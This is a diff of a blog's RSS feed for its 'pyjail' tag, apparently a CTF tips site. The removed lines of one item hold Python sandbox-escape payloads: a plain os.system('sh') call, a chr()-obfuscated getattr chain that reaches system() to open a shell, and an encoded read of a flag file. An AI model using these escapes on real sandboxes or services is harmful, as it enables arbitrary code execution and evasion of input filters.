@@ -1,21 +1,19 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>pyjail on P3troL1er的个人博客</title>
+    <title>pyjail | P3troL1er的个人博客</title>
     <link>https://peterliuzhi.top/tags/pyjail/</link>
-    <description>Recent content in pyjail on P3troL1er的个人博客</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>zh</language>
-    <copyright>&amp;copy; 2023 &lt;a href=&#34;https://github.com/PeterLiu-all&#34;&gt;Peter Liu&lt;/a&gt;
-</copyright>
-    <lastBuildDate>Fri, 23 Dec 2022 03:01:44 +0800</lastBuildDate><atom:link href="https://peterliuzhi.top/tags/pyjail/index.xml" rel="self" type="application/rss+xml" />
+      <atom:link href="https://peterliuzhi.top/tags/pyjail/index.xml" rel="self" type="application/rss+xml" />
+    <description>pyjail</description>
+    <generator>Hugo -- gohugo.io AND <a href="https://github.com/wangchucheng/hugo-eureka/">Eureka</a></generator><language>zh</language><copyright>© 2023 Peter Liu </copyright><lastBuildDate>Fri, 23 Dec 2022 03:01:44 +0800</lastBuildDate>
     <item>
       <title>绕过pyjail——一句话RCE</title>
       <link>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/</link>
       <pubDate>Fri, 23 Dec 2022 03:01:44 +0800</pubDate>
-      
       <guid>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/</guid>
-      <description>Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley 基础版 __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanla</description>
+      
+      <description>一句话RCE</description>
+      
     </item>
     
   </channel>
